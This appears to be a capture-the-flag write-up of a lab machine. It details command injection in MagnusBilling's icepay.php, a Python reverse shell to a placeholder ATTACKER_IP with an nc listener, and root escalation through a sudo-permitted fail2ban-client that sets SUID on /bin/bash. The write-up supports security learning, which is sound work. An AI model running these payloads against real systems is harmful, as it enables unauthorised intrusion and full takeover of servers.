# BillingV2-Badr – Remote Code Execution → Fail2Ban Privilege Escalation

## 🧠 Overview
This machine was compromised by exploiting a remote code execution vulnerability in the MagnusBilling platform, obtaining a reverse shell, and escalating privileges through a misconfigured Fail2Ban setup.

---

Enumeration

Begin with a Nmap Scan:
nmap -sC -sV <TARGET_IP>

<img width="635" height="365" alt="image" src="https://github.com/user-attachments/assets/a946de05-bfc3-4652-8d07-cb2dd277a501" />

Port 80 was open, so I moved to the web application.

Web Enumeration:

Navigated to the site:

http://<TARGET_IP>

A login page was presented, a note in the briefing mentioned brute force attacks were out of scope so we'll skip bruteforcing the login page.
Viewing the page source revealed the application name:
magnusbilling

<img width="332" height="200" alt="image" src="https://github.com/user-attachments/assets/b5d43e98-d062-44bc-a5f7-48e5856180f2" />

Vulnerability Discovery:

Searching for public exploits related to MagnusBilling on exploit-db, we find https://www.exploit-db.com/exploits/52170
Revealed a known command injection vulnerability.

Exploitation:

Tested the PoC:

http://<TARGET_IP>/mbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt

A file named testfile was created, confirming command execution. However, no file was written to /tmp, indicating output redirection was unreliable.

Gaining RCE:

Instead of relying on file output, I switched to a reverse shell.

Started a listener:

nc -lvnp 4477

Then sent a Python reverse shell payload:

http://<TARGET_IP>/mbilling/lib/icepay/icepay.php?democ=testfile; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4477));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

This successfully returned a shell as:

asterisk@target

The shell is then upgraded to a propper TTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm

User Access

Navigated to the home directory:

cd /home/magnus

Retrieved the user flag:

cat user.txt

<img width="546" height="130" alt="image" src="https://github.com/user-attachments/assets/aafae3db-3abd-4ca3-897f-c889b0afd9ff" />

Privilege Escalation

Checked sudo permissions:

sudo -l

Found that fail2ban-client could be executed as root without a password.

<img width="635" height="201" alt="image" src="https://github.com/user-attachments/assets/a9ec3819-5516-4a66-9000-582fb4de89f9" />


Exploiting Fail2Ban

Using the GTFOBins technique, I created a malicious Fail2Ban configuration to execute commands as root:

TF=$(mktemp -d)

cat >"$TF/fail2ban.conf" <<'EOF'
[Definition]
EOF

cat >"$TF/jail.local" <<'EOF'
[x]
enabled = true
action = x
EOF

mkdir -p "$TF/action.d"
cat >"$TF/action.d/x.conf" <<'EOF'
[Definition]
actionstart = chmod +s /bin/bash
EOF

mkdir -p "$TF/filter.d"
cat >"$TF/filter.d/x.conf" <<'EOF'
[Definition]
EOF

Executed the exploit:

sudo fail2ban-client -x -c "$TF" -v restart
Root Access

Spawned a root shell:

/bin/bash -p
id

Retrieved the root flag:

cat /root/root.txt

<img width="752" height="153" alt="image" src="https://github.com/user-attachments/assets/ea89e67c-8d7a-41e3-919f-a4189806c803" />

Conclusion:

Reverse shell provided reliable RCE

Misconfigured Fail2Ban led to full privilege escalation

